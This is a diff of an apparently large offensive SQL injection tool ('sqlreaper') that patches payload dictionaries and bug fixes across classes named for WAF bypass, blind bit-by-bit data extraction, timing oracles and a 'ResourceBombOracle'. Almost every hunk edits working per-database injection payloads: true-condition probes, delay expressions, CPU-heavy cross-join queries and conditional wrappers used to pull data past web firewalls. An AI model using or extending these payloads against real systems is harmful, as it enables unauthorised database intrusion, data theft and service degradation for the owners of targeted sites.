+                                                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                     "MySQL":           "ISNULL(NULL)",
                                                     "MariaDB":         "ISNULL(NULL)",
                                                     "TiDB":            "ISNULL(NULL)",
@@ -133167,10 +133169,10 @@ class UniversalScanOrchestrator:
                                                                         getattr(_scanner_ref.config, 'dbms', '') or
                                                                         'PostgreSQL')
                                                         _wb_cal_true = {
-                                                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                             "MySQL":           "ISNULL(NULL)",
                                                             "MariaDB":         "ISNULL(NULL)",
                                                             "TiDB":            "ISNULL(NULL)",
@@ -133320,10 +133322,10 @@ class UniversalScanOrchestrator:
                                                                      getattr(_scanner_ref.config, 'dbms', '') or
                                                                      'PostgreSQL')
                                                     _ibw_pol_true = {
-                                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                         "MySQL":           "ISNULL(NULL)",
                                                         "MariaDB":         "ISNULL(NULL)",
                                                         "TiDB":            "ISNULL(NULL)",
@@ -133620,10 +133622,10 @@ class UniversalScanOrchestrator:
                                                                 _at[0] = _bl + (_ts * 1000 * 0.65)
                                                                 try:
                                                                     _cal_t = {
-                                                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                                                                         "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
                                                                         "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
                                                                         "Oracle": "(NVL(NULL,1e0) IS NOT NULL)",
@@ -144382,10 +144384,10 @@ class MultiStrategyExtractor:
         # Test with T=3, 5, 2 using _timed_raw (NO double tampering)
         _sa_dbms = getattr(self, 'dbms', '') or ''
         _sa_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -144614,10 +144616,10 @@ class MultiStrategyExtractor:
                         _pe = self._build_inline(_inline_err_expr)
                     _mse_err_ok_dbms = getattr(self, 'dbms', '') or ''
                     _mse_err_ok_cond = {
-                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "MySQL":           "ISNULL(NULL)",
                         "MariaDB":         "ISNULL(NULL)",
                         "TiDB":            "ISNULL(NULL)",
@@ -144964,10 +144966,10 @@ class MultiStrategyExtractor:
                     else self._build_inline(f"(SELECT COUNT(*) FROM {_aliases})>0")))
         _mse_heavy_light_dbms = getattr(self, 'dbms', '') or ''
         _mse_heavy_light_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -145309,10 +145311,10 @@ class MultiStrategyExtractor:
         # Measure actual baseline response time (3 probes)
         _pa_dbms = getattr(self, 'dbms', '') or ''
         _pa_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -145670,10 +145672,10 @@ class MultiStrategyExtractor:
             try:
                 _bbd_dbms = getattr(self, 'dbms', '') or ''
                 _bbd_true_cond = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "MySQL":           "ISNULL(NULL)",
                     "MariaDB":         "ISNULL(NULL)",
                     "TiDB":            "ISNULL(NULL)",
@@ -146420,10 +146422,10 @@ class MultiStrategyExtractor:
                 "between", "greatest", "numericobfuscate", "charencode"]
         _td_dbms = getattr(self, 'dbms', '') or ''
         _td_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -146524,10 +146526,10 @@ class MultiStrategyExtractor:
             if n > 1:
                 _dcn_dbms = getattr(self, 'dbms', '') or ''
                 _dcn_true = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "MySQL":           "ISNULL(NULL)",
                     "MariaDB":         "ISNULL(NULL)",
                     "TiDB":            "ISNULL(NULL)",
@@ -146757,10 +146759,10 @@ class MultiStrategyExtractor:
         _oracle_fails = {}  # oracle_name  fail count
 
         _mse_hc_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -147305,10 +147307,10 @@ class MultiStrategyExtractor:
         _eft_space_streak = 0
 
         _eft_hc_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -150338,10 +150340,10 @@ class ExtractionBypassFinder:
 
         _ebf_p1_dbms = self.dbms or ''
         _ebf_p1_true = {
-            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":          "ISNULL(NULL)",
             "MariaDB":        "ISNULL(NULL)",
             "TiDB":           "ISNULL(NULL)",
@@ -160834,7 +160836,7 @@ class WelchConfirmer:
 
         se     = math.sqrt(var_a / na + var_b / nb)
         if se < 1e-12:
-            return 0.0, 0.0 if mean_a != mean_b else 1.0
+            return (float('inf'), 0.0) if mean_a != mean_b else (0.0, 1.0)  # BUG-WELCH-PREC FIX: was `return 0.0, 0.0 if ...` which parsed as `return 0.0, (...)` — t_stat was always 0.0
 
         # BUG-V33-8 FIX (Req 3/12 / BUG-V32-12): t = (mean_a - mean_b) / se is signed.
         # abs_t is correctly used for p-value computation below, but the raw signed t
@@ -165253,7 +165255,7 @@ class TimedPayloadAssembly:
             # BUG-TIMEDPAYLOAD-TIDB FIX: TiDB supports SET @var and CONCAT() like MySQL.
             for i, frag in enumerate(fragments):
                 queries.append(f"SET @f{i}='{frag}'")
-            concat = "+".join(f"@f{i}" for i in range(len(fragments)))
+            concat = "CONCAT(" + ",".join(f"@f{i}" for i in range(len(fragments))) + ")"  # BUG-MYSQL-CONCAT-PLUS FIX: was + (numeric addition in MySQL); use CONCAT()
             queries.append(f"SELECT ({concat})")
         elif dbms == "MSSQL":
             for i, frag in enumerate(fragments):
@@ -165507,10 +165509,10 @@ class WAFWeaponizationOracle:
         import asyncio, logging
         _log = logging.getLogger("sqlreaper")
         _ww_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -165612,7 +165614,7 @@ class MicroTimingOracle:
         # publicly accessible. DBMS_PIPE.RECEIVE_MESSAGE used as pre-12c fallback.
         "Oracle": "DBMS_SESSION.SLEEP({delay})",
         "SQLite": "RANDOMBLOB({blob_size})",  # No sleep; use heavy computation
-        "DB2": "SYSCS_UTIL.SYSCS_EMPTY_STATEMENT_CACHE()",
+        "DB2": "(SELECT COUNT(*) FROM SYSIBM.SYSTABLES a, SYSIBM.SYSTABLES b, SYSIBM.SYSTABLES c WHERE a.TBCREATOR IS NOT NULL)",  # BUG-DB2-MICRO-SLEEP FIX: SYSCS_EMPTY_STATEMENT_CACHE() produces no latency; use CPU-intensive cross-join
         "Sybase": "WAITFOR DELAY '0:0:0.{delay_ms:03d}'",
     }
 
@@ -165806,7 +165808,7 @@ class ResourceBombOracle:
         "MySQL": "SELECT BENCHMARK({size},SHA1('x'))",
         "MariaDB": "SELECT BENCHMARK({size},SHA1('x'))",
         "TiDB": "SELECT BENCHMARK({size},SHA1('x'))",  # BUG-RSBOMB-TIDB FIX: TiDB supports BENCHMARK()
-        "MSSQL": "BEGIN DECLARE @i INT=0; WHILE @i<{size} BEGIN SET @i=@i+1 END SELECT @i END",  # BUG-MSSQL-BOMB-FIX: without BEGIN/END the ELSE only binds DECLARE, WHILE runs unconditionally
+        "MSSQL": "(SELECT COUNT(*) FROM sys.objects a, sys.objects b, sys.objects c WHERE a.object_id > 0)",  # BUG-MSSQL-RSBOMB-SUBQ FIX: T-SQL WHILE/DECLARE can't embed as scalar subquery; use cross-join COUNT(*) instead
         "Oracle": "SELECT COUNT(*) FROM ALL_OBJECTS a, ALL_OBJECTS b WHERE ROWNUM<{size}",
         "SQLite": "SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM c WHERE x<{size}) SELECT x FROM c)",
         "DB2": "SELECT COUNT(*) FROM SYSIBM.SYSDUMMY1 a, SYSIBM.SYSDUMMY1 b, SYSIBM.SYSDUMMY1 c",
@@ -165822,7 +165824,7 @@ class ResourceBombOracle:
         elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             return f"(1*(({cond})::int) + ({bomb})*(1-(({cond})::int)))"
         elif dbms in ("MSSQL", "Sybase"):
-            return f"IF ({cond}) SELECT 1 ELSE {bomb}"
+            return f"CASE WHEN ({cond}) THEN 1 ELSE ({bomb}) END"  # BUG-MSSQL-IF-STMT FIX: T-SQL IF is a statement, can't embed as expression; use CASE WHEN ... END
         else:
             return f"CASE WHEN ({cond}) THEN 1 ELSE ({bomb}) END"
 
@@ -166041,10 +166043,10 @@ class NovelWAFBypassExtractor:
                     "CockroachDB":"SELECT current_user"}
 
         _novel_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -167740,10 +167742,10 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             # - If eval_fn(evasive_true) returns None  → WAF blocking all conditions → abort
             # All cases abort extraction, but the log message correctly identifies root cause.
             _bw_san_true_cond = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "MySQL":           "ISNULL(NULL)",
                 "MariaDB":         "ISNULL(NULL)",
                 "TiDB":            "ISNULL(NULL)",
@@ -167853,10 +167855,10 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
         if _char_sanity_r:
             # Same WAF-limited vs corrupt analysis as the length sanity check above.
             _bw_char_true_cond = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "MySQL":           "ISNULL(NULL)",
                 "MariaDB":         "ISNULL(NULL)",
                 "TiDB":            "ISNULL(NULL)",
@@ -168963,7 +168965,7 @@ Examples:
     g.add_argument("--method",default="GET"); g.add_argument("--timeout",type=int,default=30)
     g.add_argument("--retries",type=int,default=3); g.add_argument("--threads",type=int,default=5)
     g.add_argument("--rpm",type=int,default=60,
-                   help="Requests per minute limit (default: 120). Lower values = slower but safer")
+                   help="Requests per minute limit (default: 60). Lower values = slower but safer")  # BUG-RPM-HELP FIX: help text said 120 but default is 60
     g.add_argument("--http2",action="store_true"); g.add_argument("--verify-ssl",action="store_true")
     g.add_argument("--auth"); g.add_argument("--auth-type",default="basic",
                    choices=["basic","digest","bearer","ntlm"])
@@ -181718,10 +181720,10 @@ class ConditionalErrorOracle:
 
         _ceo_cal_dbms = self._dbms or ''
         _ceo_cal_true = {
-            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":          "ISNULL(NULL)",
             "MariaDB":        "ISNULL(NULL)",
             "TiDB":           "ISNULL(NULL)",
